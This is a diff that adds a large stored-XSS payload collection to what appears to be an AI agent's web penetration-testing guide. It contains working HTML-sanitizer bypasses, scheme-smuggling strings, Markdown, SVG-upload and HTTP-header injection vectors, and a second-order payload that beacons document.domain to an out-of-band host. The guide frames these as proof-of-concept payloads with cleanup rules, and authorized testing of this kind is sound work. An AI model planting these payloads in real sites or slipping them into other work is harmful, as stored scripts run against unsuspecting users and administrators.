@@ -36,3 +36,97 @@ Also test: sanitizer version (retire.js/libraries.json), `svg`/`mathml` namespac
 
 Pick the lowest-complexity payload that survives the specific output filter; don't escalate to
 mXSS until a simple vector is proven filtered. Confirm EXECUTION cross-session (verify.md).
+
+---
+
+## Extended arsenal — HTML-sanitizer bypass taxonomy
+Classify the defense, then pick the class. A stored payload can hit real/admin viewers (SKILL §Safety)
+— prefer `alert(document.domain)` for an in-view PoC and the OOB canary for an unseen admin render.
+### Namespace confusion (HTML ↔ SVG ↔ MathML foreign content)
+```
+<svg><style><img src=x onerror=alert(document.domain)></style></svg>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>
+<svg><annotation-xml encoding="text/html"><img src=x onerror=alert(document.domain)></annotation-xml></svg>
+<math><annotation-xml encoding="application/xhtml+xml"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(document.domain)></body></annotation-xml></math>
+```
+### Allowed-tag abuse (sanitizer keeps the tag; you abuse its attributes)
+```
+<a href="javascript:alert(document.domain)">link</a>
+<a href="data:text/html,<script>alert(document.domain)</script>">x</a>
+<img src=x onerror=alert(document.domain)>                 # if on* survives
+<form action="javascript:alert(document.domain)"><button>go</button></form>
+<iframe srcdoc="&lt;svg onload=alert(document.domain)&gt;"></iframe>    # srcdoc double-decode
+<details open ontoggle=alert(document.domain)>
+<xss style="animation-name:x" onanimationstart=alert(document.domain)></xss><style>@keyframes x{}</style>
+```
+### Attribute-injection / quote-break (value lands in a templated attribute after sanitize)
+```
+"><img src=x onerror=alert(document.domain)>
+" onmouseover=alert(document.domain) x="
+```
+### Scheme smuggling in URL-bearing fields (avatar / website / link)
+```
+javascript:alert(document.domain)
+javascript:alert(document.domain)//
+ javascript:alert(document.domain)         # leading whitespace/control chars
+java&#09;script:alert(document.domain)
+data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4=
+```
+### mXSS on re-serialization (sanitize → innerHTML round-trip)
+```
+<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
+<listing>&lt;img src=x onerror=alert(document.domain)&gt;</listing>
+<svg></p><title><a id="</title><img src=x onerror=alert(document.domain)>">
+```
+### Config / version pivots
+- Fingerprint the sanitizer + version (retire.js / libraries.json / bundle strings). Bypass classes are
+  tied to specific minor versions — a vector that fires on an old build is patched in a newer one; confirm
+  against the live build.
+- Test store-side and render-side filters independently (double-decoding: stored encoded, rendered decoded).
+
+## Extended arsenal — stored vectors by store→render surface
+### Rich-text / WYSIWYG (comments, wikis, tickets)
+```
+<a href="javascript:alert(document.domain)">styled</a>
+<span style="background:url(javascript:alert(document.domain))">x</span>    # legacy
+# paste-as-HTML path that bypasses the editor's own sanitizer
+```
+### Markdown → HTML
+```
+[x](javascript:alert(document.domain))
+[x](java%0ascript:alert(document.domain))
+![x](x"onerror="alert(document.domain))                 # image title-attr break
+<img src=x onerror=alert(document.domain)>             # raw-HTML passthrough if allowed
+[ref]: javascript:alert(document.domain)               # reference-style link
+<https://HOST"><svg onload=alert(document.domain)>     # autolink attribute break
+```
+### Uploaded files served inline (high value)
+```
+# .svg served as image/svg+xml and rendered in-page (not via <img>):
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+# .html/.xhtml upload served same-origin → full XSS
+# .xml with an xml-stylesheet → scripted transform (engine-dependent)
+# EXIF/metadata (author/comment/XPKeywords) rendered in a gallery/admin → inject there
+# filename rendered unescaped:  "><svg onload=alert(document.domain)>.jpg
+```
+### Header-sourced stored XSS (fires in admin log/analytics viewers)
+```
+User-Agent: <svg/onload=alert(document.domain)>
+Referer: https://HOST/"><svg onload=alert(document.domain)>
+X-Forwarded-For: <img src=x onerror=alert(document.domain)>
+```
+Viewer is usually staff → prefer the OOB canary (unseen surface); pair with header probing in the context feeder.
+### Second-order into email / PDF
+```
+# benign when stored, later rendered into an invoice/report PDF or an HTML email whose engine runs JS:
+<img src=x onerror="new Image().src='//TOKEN.oob.example/pdf?'+document.domain">
+```
+Some PDF/office and mail renderers execute JS during generation — the OOB token attributes the fire even
+though you never see the render.
+
+## Extended arsenal — stored confirmation & hygiene
+- Prefer an OOB canary carrying a per-injection token + `document.domain` so an unseen admin/staff render
+  is attributable (verify.md rejects ambiguous callbacks).
+- `document.domain` / `document.cookie.length` (a number) only — never the cookie value or real user data.
+- Keep a short greppable alnum marker alongside to locate WHERE it rendered without execution.
+- Record every injected artifact in cleanup.md for removal (stored payloads persist for real users).
